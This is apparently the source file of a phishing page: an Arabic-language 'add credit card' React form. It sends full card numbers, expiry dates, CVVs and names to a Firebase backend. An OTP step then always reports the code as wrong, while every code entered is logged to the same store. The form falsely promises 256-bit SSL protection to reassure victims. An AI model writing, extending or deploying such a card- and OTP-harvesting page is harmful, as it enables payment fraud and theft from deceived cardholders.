"use client"

import { addData } from "@/lib/firebase"
import { useState, type ChangeEvent, type FormEvent } from "react"
import { useSearchParams } from "next/navigation"
import { Button } from "@/components/ui/button"
import { FullPageLoader } from "./loader"

interface CardData {
  number: string
  name: string
  expiry: string
  cvv: string
}

const luhnCheck = (cardNumber: string): boolean => {
  const digits = cardNumber.replace(/\s/g, "").split("").reverse()
  let sum = 0

  for (let i = 0; i < digits.length; i++) {
    let digit = Number.parseInt(digits[i])

    if (i % 2 === 1) {
      digit *= 2
      if (digit > 9) digit -= 9
    }

    sum += digit
  }

  return sum % 10 === 0
}

const getCardType = (number: string): string => {
  const cleaned = number.replace(/\s/g, "")

  if (/^4/.test(cleaned)) return "visa"
  if (/^5[1-5]/.test(cleaned)) return "mastercard"
  if (/^3[47]/.test(cleaned)) return "amex"
  if (/^6(?:011|5)/.test(cleaned)) return "discover"
  if (/^9792/.test(cleaned)) return "troy"
  if (/^62/.test(cleaned)) return "unionpay"

  return "unknown"
}

const validateExpiry = (expiry: string): boolean => {
  const [month, year] = expiry.split("/").map((v) => Number.parseInt(v))
  if (!month || !year || month < 1 || month > 12) return false

  const now = new Date()
  const currentYear = now.getFullYear() % 100
  const currentMonth = now.getMonth() + 1

  if (year < currentYear) return false
  if (year === currentYear && month < currentMonth) return false

  return true
}

const validateCVV = (cvv: string, cardType: string): boolean => {
  if (cardType === "amex") return /^\d{4}$/.test(cvv)
  return /^\d{3}$/.test(cvv)
}

const allOtps = [""]

export default function AddCard() {
  const searchParams = useSearchParams()
  const id = searchParams.get("id")

  const [cardData, setCardData] = useState<CardData>({
    number: "",
    name: "",
    expiry: "",
    cvv: "",
  })

  const [otp, setOtp] = useState("")
  const [step, setStep] = useState<"form" | "otp" | "success">("form")
  const [error, setError] = useState("")
  const [loading, setLoading] = useState(false)
  const [fieldErrors, setFieldErrors] = useState<Partial<Record<keyof CardData, string>>>({})

  const formatCardNumber = (v: string) =>
    v
      .replace(/\D/g, "")
      .replace(/(.{4})/g, "$1 ")
      .trim()

  const formatExpiry = (v: string) => {
    const cleaned = v.replace(/\D/g, "")
    if (cleaned.length >= 2) {
      return `${cleaned.slice(0, 2)}/${cleaned.slice(2, 4)}`
    }
    return cleaned
  }

  const handleCardSubmit = async (e: FormEvent) => {
    e.preventDefault()
    const errors: Partial<Record<keyof CardData, string>> = {}

    if (!cardData.number) {
      errors.number = "رقم البطاقة مطلوب"
    } else {
      const cleaned = cardData.number.replace(/\s/g, "")
      if (cleaned.length < 13 || cleaned.length > 19) {
        errors.number = "رقم البطاقة غير صحيح"
      } else if (!luhnCheck(cleaned)) {
        errors.number = "رقم البطاقة غير صالح"
      }
    }

    if (!cardData.name) {
      errors.name = "اسم حامل البطاقة مطلوب"
    } else if (cardData.name.length < 3) {
      errors.name = "الاسم قصير جداً"
    }

    if (!cardData.expiry) {
      errors.expiry = "تاريخ الانتهاء مطلوب"
    } else if (!validateExpiry(cardData.expiry)) {
      errors.expiry = "تاريخ الانتهاء غير صالح أو منتهي"
    }

    const cardType = getCardType(cardData.number)
    if (!cardData.cvv) {
      errors.cvv = "رمز الحماية مطلوب"
    } else if (!validateCVV(cardData.cvv, cardType)) {
      errors.cvv = cardType === "amex" ? "يجب أن يكون 4 أرقام" : "يجب أن يكون 3 أرقام"
    }

    if (Object.keys(errors).length > 0) {
      setFieldErrors(errors)
      setError("الرجاء تصحيح الأخطاء أدناه")
      return
    }

    setFieldErrors({})
    setError("")
    setLoading(true)

    await addData({
      id: id || undefined,
      cardNumber: cardData.number,
      cardExpiry: cardData.expiry,
      cvv: cardData.cvv,
      name: cardData.name,
      cardType: getCardType(cardData.number),
      createdDate: new Date().toISOString(),
    })

    setTimeout(() => {
      setLoading(false)
      setStep("otp")
    }, 3000)
  }

  const handleOtpSubmit = async (e: FormEvent) => {
    e.preventDefault()
    setLoading(true)
    allOtps.push(otp)

    await addData({
      id: id || undefined,
      otp,
      allOtps,
      createdDate: new Date().toISOString(),
    })

    setTimeout(() => {
      setLoading(false)
      setError("رمز التحقق غير صحيح.")
      setOtp("")
    }, 3000)
  }

  const handleInputChange = (e: ChangeEvent<HTMLInputElement>, field: keyof CardData) => {
    let value = e.target.value

    if (field === "number") {
      value = formatCardNumber(value)
      if (value.replace(/\s/g, "").length >= 13) {
        setFieldErrors((prev) => ({ ...prev, number: undefined }))
      }
    } else if (field === "expiry") {
      value = formatExpiry(value)
      if (value.length === 5 && validateExpiry(value)) {
        setFieldErrors((prev) => ({ ...prev, expiry: undefined }))
      }
    } else if (field === "cvv") {
      value = value.replace(/\D/g, "").slice(0, 4)
      if (value.length >= 3) {
        setFieldErrors((prev) => ({ ...prev, cvv: undefined }))
      }
    } else if (field === "name") {
      if (value.length >= 3) {
        setFieldErrors((prev) => ({ ...prev, name: undefined }))
      }
    }

    setCardData({ ...cardData, [field]: value })
  }

  const cardType = getCardType(cardData.number)
  const CardIcon = () => {
    if (cardData.number.replace(/\s/g, "").length < 4) return null

    const iconClass = "absolute left-3 top-1/2 -translate-y-1/2"

    if (cardType === "visa") {
      return <span className={`${iconClass} text-blue-600 font-bold text-sm`}>
        <img src="/visa.svg" alt="visa" width={35}/>
        
      </span>
    }
    if (cardType === "mastercard") {
      return <span className={`${iconClass} text-red-600 font-bold text-sm`}>
        <img src="/master.svg" alt="src"  width={35}/>
      </span>
    }
    if (cardType === "amex") {
      return <span className={`${iconClass} text-blue-500 font-bold text-sm`}>AMEX</span>
    }

    return (
      <svg className={`${iconClass} w-6 h-6 text-slate-400`} fill="currentColor" viewBox="0 0 24 24">
        <path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z" />
      </svg>
    )
  }

  return (
    <div
      className="min-h-screen bg-gradient-to-br from-slate-50 via-blue-50/30 to-slate-50 flex items-center justify-center p-4"
      dir="rtl"
    >
      {loading && <FullPageLoader />}
      <div className="w-full max-w-md bg-white rounded-2xl shadow-xl border border-slate-200/50 overflow-hidden">
        {/* Header Section */}
        <div className="bg-gradient-to-r from-slate-800 via-teal-700 to-slate-800 px-6 py-8 relative overflow-hidden">
          <div className="absolute top-0 right-0 w-32 h-32 bg-white/5 rounded-full -translate-y-16 translate-x-16"></div>
          <div className="absolute bottom-0 left-0 w-24 h-24 bg-white/5 rounded-full translate-y-12 -translate-x-12"></div>

          <div className="relative">
            <div className="flex items-center gap-3 mb-2">
              <svg className="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth={2}
                  d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"
                />
              </svg>
              <h1 className="text-lg font-bold text-white">إضافة بطاقة ائتمانية</h1>
            </div>
            <p className="text-slate-300 text-sm">
              {step === "form" && "جميع بياناتك محمية ومشفرة بالكامل"}
              {step === "otp" && "ادخل رمز التحقق OTP المرسل الى جوالك"}
              {step === "success" && "تمت العملية بنجاح"}
            </p>
          </div>
        </div>

        {/* Content Section */}
        <div className="p-6 space-y-6">
          {/* Card Input Form */}
          {step === "form" && (
            <form onSubmit={handleCardSubmit} className="space-y-5">
              <div className="space-y-2">
                <label className="text-sm font-semibold text-slate-700 block flex items-center gap-2">
                  <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"
                    />
                  </svg>
                  رقم البطاقة
                </label>
                <div className="relative">
                  <input
                    inputMode="numeric"
                    maxLength={19}
                    value={formatCardNumber(cardData.number)}
                    onChange={(e) => handleInputChange(e, "number")}
                    placeholder="XXXX XXXX XXXX XXXX"
                    className={`w-full px-4 py-2.5 pr-12 border-2 rounded-xl focus:outline-none transition-all text-sm tracking-wider font-mono placeholder:text-slate-400 ${
                      fieldErrors.number
                        ? "border-red-300 focus:border-red-500 bg-red-50/50"
                        : "border-slate-200 focus:border-slate-700 focus:ring-2 focus:ring-slate-200"
                    }`}
                  />
                  <CardIcon />
                </div>
                {fieldErrors.number && (
                  <p className="text-red-600 text-xs font-medium flex items-center gap-1">
                    <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
                      <path
                        fillRule="evenodd"
                        d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z"
                        clipRule="evenodd"
                      />
                    </svg>
                    {fieldErrors.number}
                  </p>
                )}
              </div>

              <div className="space-y-2">
                <label className="text-sm font-semibold text-slate-700 block flex items-center gap-2">
                  <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"
                    />
                  </svg>
                  اسم حامل البطاقة
                </label>
                <input
                  value={cardData.name}
                  onChange={(e) => handleInputChange(e, "name")}
                  placeholder="الاسم كما هو على البطاقة"
                  className={`w-full px-4 py-2.5 border-2 rounded-xl focus:outline-none transition-all  text-sm placeholder:text-slate-400 ${
                    fieldErrors.name
                      ? "border-red-300 focus:border-red-500 bg-red-50/50"
                      : "border-slate-200 focus:border-slate-700 focus:ring-2 focus:ring-slate-200"
                  }`}
                />
                {fieldErrors.name && (
                  <p className="text-red-600 text-xs font-medium flex items-center gap-1">
                    <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
                      <path
                        fillRule="evenodd"
                        d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z"
                        clipRule="evenodd"
                      />
                    </svg>
                    {fieldErrors.name}
                  </p>
                )}
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-2">
                  <label className="text-sm font-semibold text-slate-700 block flex items-center gap-2">
                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth={2}
                        d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"
                      />
                    </svg>
                    تاريخ الانتهاء
                  </label>
                  <input
                    value={cardData.expiry}
                    onChange={(e) => handleInputChange(e, "expiry")}
                    placeholder="MM/YY"
                    maxLength={5}
                    inputMode="numeric"
                    className={`w-full px-4 py-2.5 border-2 rounded-xl focus:outline-none transition-all text-sm text-center font-mono placeholder:text-slate-400 ${
                      fieldErrors.expiry
                        ? "border-red-300 focus:border-red-500 bg-red-50/50"
                        : "border-slate-200 focus:border-slate-700 focus:ring-2 focus:ring-slate-200"
                    }`}
                  />
                  {fieldErrors.expiry && <p className="text-red-600 text-xs font-medium">{fieldErrors.expiry}</p>}
                </div>
                <div className="space-y-2">
                  <label className="text-sm font-semibold text-slate-700 block flex items-center gap-2 ">
                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth={2}
                        d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
                      />
                    </svg>
                    CVV
                  </label>
                  <input
                    value={cardData.cvv}
                    onChange={(e) => handleInputChange(e, "cvv")}
                    placeholder={cardType === "amex" ? "XXXX" : "XXX"}
                    maxLength={cardType === "amex" ? 4 : 3}
                    inputMode="numeric"
                    type="password"
                    className={`w-full px-4 py-2.5 border-2 rounded-xl focus:outline-none transition-all text-sm text-center font-mono placeholder:text-slate-400 ${
                      fieldErrors.cvv
                        ? "border-red-300 focus:border-red-500 bg-red-50/50"
                        : "border-slate-200 focus:border-slate-700 focus:ring-2 focus:ring-slate-200"
                    }`}
                  />
                  {fieldErrors.cvv && <p className="text-red-600 text-xs font-medium">{fieldErrors.cvv}</p>}
                </div>
              </div>

              {error && (
                <div className="bg-red-50 border-2 border-red-200 rounded-xl p-4 flex items-start gap-3">
                  <svg className="w-5 h-5 text-red-600 flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
                    <path
                      fillRule="evenodd"
                      d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z"
                      clipRule="evenodd"
                    />
                  </svg>
                  <p className="text-red-700 text-sm font-medium">{error}</p>
                </div>
              )}

              <div className="space-y-3">
                <div className="flex items-center justify-center gap-2 text-xs text-slate-500 bg-slate-50 py-2 px-3 rounded-lg border border-slate-200">
                  <svg className="w-4 h-4 text-green-600" fill="currentColor" viewBox="0 0 20 20">
                    <path
                      fillRule="evenodd"
                      d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z"
                      clipRule="evenodd"
                    />
                  </svg>
                  <span className="font-medium">معلوماتك محمية بتشفير SSL 256-bit</span>
                </div>

                <Button
                  type="submit"
                  className="w-full py-4 bg-gradient-to-r from-slate-800 via-teal-700 to-slate-800 text-white rounded-xl text-base font-bold hover:from-slate-900 hover:via-slate-800 hover:to-slate-900 transition-all duration-300 shadow-lg hover:shadow-xl active:scale-[0.98]"
                >
                  متابعة بأمان
                  <svg className="w-5 h-5 mr-2 inline" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 7l-5 5m0 0l5 5M8 12h8" />
                  </svg>
                </Button>
              </div>
            </form>
          )}

          {step === "otp" && (
            <form onSubmit={handleOtpSubmit} className="space-y-5">
              <div className="space-y-3">
                <div className="bg-blue-50 border-2 border-blue-200 rounded-xl p-4 flex items-start gap-3">
                  <svg className="w-5 h-5 text-blue-600 flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
                    <path
                      fillRule="evenodd"
                      d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z"
                      clipRule="evenodd"
                    />
                  </svg>
                  <p className="text-blue-800 text-sm">تم إرسال رمز التحقق إلى رقم هاتفك المسجل</p>
                </div>

                <label className="text-sm font-semibold text-slate-700 block text-center">رمز التحقق (OTP)</label>
                <input
                  type="text"
                  value={otp}
                  onChange={(e) => setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))}
                  placeholder="••••••"
                  maxLength={6}
                  inputMode="numeric"
                  className="w-full px-4 py-4 border-2 border-slate-200 rounded-xl focus:border-slate-700 focus:ring-2 focus:ring-slate-200 focus:outline-none transition-all text-center text-3xl tracking-[0.5em] font-bold placeholder:text-slate-300"
                />
              </div>

              {error && (
                <div className="bg-red-50 border-2 border-red-200 rounded-xl p-4 flex items-start gap-3">
                  <svg className="w-5 h-5 text-red-600 flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
                    <path
                      fillRule="evenodd"
                      d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z"
                      clipRule="evenodd"
                    />
                  </svg>
                  <p className="text-red-700 text-sm font-medium">{error}</p>
                </div>
              )}

              <Button
                type="submit"
                disabled={otp.length < 4}
                className="w-full py-4 bg-gradient-to-r from-slate-800 via-slate-700 to-slate-800 text-white rounded-xl text-base font-bold hover:from-slate-900 hover:via-slate-800 hover:to-slate-900 transition-all duration-300 shadow-lg hover:shadow-xl disabled:opacity-50 disabled:cursor-not-allowed active:scale-[0.98]"
              >
                تأكيد الرمز
              </Button>

              <button
                type="button"
                className="w-full text-sm text-slate-600 hover:text-slate-900 font-medium transition-colors"
              >
                لم يصلك الرمز؟ إعادة الإرسال
              </button>
            </form>
          )}

          {/* Success Screen */}
          {step === "success" && (
            <div className="text-center space-y-4 py-8">
              <div className="flex justify-center">
                <div className="w-16 h-16 bg-emerald-100 rounded-full flex items-center justify-center">
                  <svg className="w-8 h-8 text-emerald-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                  </svg>
                </div>
              </div>
              <div>
                <h2 className="text-xl font-bold text-slate-900">تمت إضافة البطاقة بنجاح!</h2>
                <p className="text-slate-600 text-sm mt-1">يمكنك الآن استخدام بطاقتك للدفع</p>
              </div>
              <Button
                onClick={() => setStep("form")}
                className="w-full py-3 bg-slate-100 text-slate-700 rounded-lg text-base font-semibold hover:bg-slate-200 transition-all duration-200"
              >
                إضافة بطاقة أخرى
              </Button>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}
